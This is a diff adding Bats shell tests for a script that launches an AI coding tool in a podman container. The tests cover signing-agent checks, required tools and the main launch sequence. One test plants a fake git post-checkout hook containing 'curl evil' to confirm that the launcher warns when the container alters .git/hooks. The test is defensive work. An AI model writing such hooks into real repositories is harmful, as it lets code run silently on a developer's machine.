@@ -871,6 +871,139 @@ setup_interactive_run() {
     [ ! -e "${TEST_TMP}/ssh-agent-stopped" ]
 }
 
+# --- host-health checks and main() ------------------------------------------------------------
+
+@test "check_signing_agents dies when gpg-agent, the signing key or the ssh-agent socket is missing" {
+    GIT_SIGNING_KEY="ABCDEF1234567890"
+    REPO_WORK_DIR="${TEST_TMP}/checkout"
+    make_stub gpg-connect-agent 'exit 1'
+    make_stub gpg 'exit 0'
+    run check_signing_agents
+    [ "${status}" -eq 1 ]
+    [[ "${output}" == *"gpg-agent is not running"* ]]
+    make_stub gpg-connect-agent 'exit 0'
+    make_stub gpg 'exit 1'
+    run check_signing_agents
+    [ "${status}" -eq 1 ]
+    [[ "${output}" == *"Signing key ABCDEF1234567890"*"not in the GPG keyring"* ]]
+    make_stub gpg 'exit 0'
+    unset SSH_AUTH_SOCK
+    run check_signing_agents
+    [ "${status}" -eq 1 ]
+    [[ "${output}" == *"SSH_AUTH_SOCK is not set or is not a socket"* ]]
+    export SSH_AUTH_SOCK="${TEST_TMP}/not-a-socket"
+    touch "${SSH_AUTH_SOCK}"
+    run check_signing_agents
+    [ "${status}" -eq 1 ]
+    [[ "${output}" == *"not a socket"* ]]
+}
+
+@test "check_interactive_tools requires the digest and gpg tools as well as the launch tools" {
+    local tool
+    for tool in git jq podman gh claude ssh-add awk gpg gpg-connect-agent gpgconf sha256sum; do
+        make_stub "${tool}" 'exit 0'
+    done
+    # PATH restricted to the stub dir for the call only, so the host's real tools cannot
+    # satisfy the check.
+    PATH="${STUB_BIN}" run check_interactive_tools
+    [ "${status}" -eq 0 ]
+    rm "${STUB_BIN}/awk"
+    PATH="${STUB_BIN}" run check_interactive_tools
+    [ "${status}" -eq 1 ]
+    [[ "${output}" == *"Required tool not found: awk"* ]]
+    make_stub awk 'exit 0'
+    rm "${STUB_BIN}/sha256sum"
+    PATH="${STUB_BIN}" run check_interactive_tools
+    [ "${status}" -eq 1 ]
+    [[ "${output}" == *"sha256sum (or shasum)"* ]]
+    make_stub shasum 'exit 0'
+    PATH="${STUB_BIN}" run check_interactive_tools
+    [ "${status}" -eq 0 ]
+}
+
+# Everything main needs on a healthy host: a checkout with an SSH origin, its own identity
+# and an .ai-instructions file, a rules checkout on main, a complete .env and token file,
+# and PATH stubs for every tool. The signing-agent and ssh-add pre-flights are overridden
+# because a test cannot create a live agent socket; they have their own tests above.
+setup_main_run() {
+    local dir
+    dir=$(make_split_identity_checkout)
+    printf '# rules\n' > "${dir}/.ai-instructions"
+    git -C "${TEST_TMP}" init -q -b main rules
+    INTERACTIVE_RULES_DIR="${TEST_TMP}/rules"
+    mkdir -p "${CONFIG_DIR}"
+    printf 'GH_HOST=github-api.example.com\nGH_TOKEN=ghp_x\nDISCORD_WEBHOOK=https://discord.example/hook\n' > "${CONFIG_DIR}/.env"
+    make_owner_token
+    make_interactive_podman_stub
+    local tool
+    for tool in gh claude ssh-add gpg gpg-connect-agent gpgconf; do
+        make_stub "${tool}" "touch '${TEST_TMP}/${tool}-ran'; exit 0"
+    done
+    terminal_available() { return 0; }
+    check_signing_agents() { touch "${TEST_TMP}/signing-agents-checked"; }
+    preload_ssh_keys() { touch "${TEST_TMP}/ssh-keys-preloaded"; }
+    add_gpg_podman_args() { :; }
+    cd "${dir}/" || return 1
+}
+
+@test "main runs the whole launch sequence from inside a checkout and returns podman's exit status" {
+    setup_main_run
+    run main
+    [ "${status}" -eq 0 ]
+    [ -e "${TEST_TMP}/signing-agents-checked" ]
+    [ -e "${TEST_TMP}/ssh-keys-preloaded" ]
+    grep -qx "${TEST_TMP}/checkout:${CONTAINER_REPO_PATH}:rw" "${TEST_TMP}/podman_args"
+    grep -qx "${TEST_TMP}/rules:${CONTAINER_RULES_PATH}:ro" "${TEST_TMP}/podman_args"
+    # The checkout's own identity, not the (absent) .env one, reaches the container.
+    grep -qx 'GIT_USER_EMAIL=repo@example.com' "${TEST_TMP}/podman_args"
+    grep -qx 'GIT_SIGNING_KEY=REPOKEY000000000' "${TEST_TMP}/podman_args"
+    grep -qx 'GH_HOST=github-api.example.com' "${TEST_TMP}/podman_args"
+    [[ "${output}" == *"Repository: credfeto/example at ${TEST_TMP}/checkout"* ]]
+    [[ "${output}" != *"changed during the session"* ]]
+    # claude is only ever run for setup-token, and the token file already exists.
+    [ ! -e "${TEST_TMP}/claude-ran" ]
+    export PODMAN_STUB_EXIT=3
+    run main
+    [ "${status}" -eq 3 ]
+}
+
+@test "main warns after the session when the container changed a hook" {
+    setup_main_run
+    cat > "${STUB_BIN}/podman.hook" << HOOKEOF
+printf '#!/bin/sh\ncurl evil\n' > '${TEST_TMP}/checkout/.git/hooks/post-checkout'
+HOOKEOF
+    # shellcheck disable=SC2016  # the $1 lines are the stub's own script text
+    make_stub_multiline podman \
+        '[ "$1" = "pull" ] && exit 0' \
+        '[ "$1" = "inspect" ] && exit 1' \
+        '[ "$1" = "secret" ] && exit 0' \
+        '[ "$1" = "image" ] && exit 0' \
+        ". '${STUB_BIN}/podman.hook'" \
+        'exit 0'
+    run main
+    [ "${status}" -eq 0 ]
+    [[ "${output}" == *".git/hooks changed during the session"* ]]
+}
+
+@test "main refuses a non-TTY launch before touching anything" {
+    setup_main_run
+    terminal_available() { return 1; }
+    run main
+    [ "${status}" -eq 1 ]
+    [[ "${output}" == *"need a terminal"* ]]
+    [ ! -e "${TEST_TMP}/podman_args" ]
+    [ ! -e "${TEST_TMP}/signing-agents-checked" ]
+}
+
+@test "main refuses a relative INTERACTIVE_RULES_DIR" {
+    setup_main_run
+    INTERACTIVE_RULES_DIR="rules"
+    run main
+    [ "${status}" -eq 1 ]
+    [[ "${output}" == *"INTERACTIVE_RULES_DIR must be an absolute path"* ]]
+    [ ! -e "${TEST_TMP}/podman_args" ]
+}
+
 # --- set_repo_context overrides ---------------------------------------------------------------
 
 @test "set_repo_context takes optional repo work dir and rules dir, defaulting to the WORK clones" {
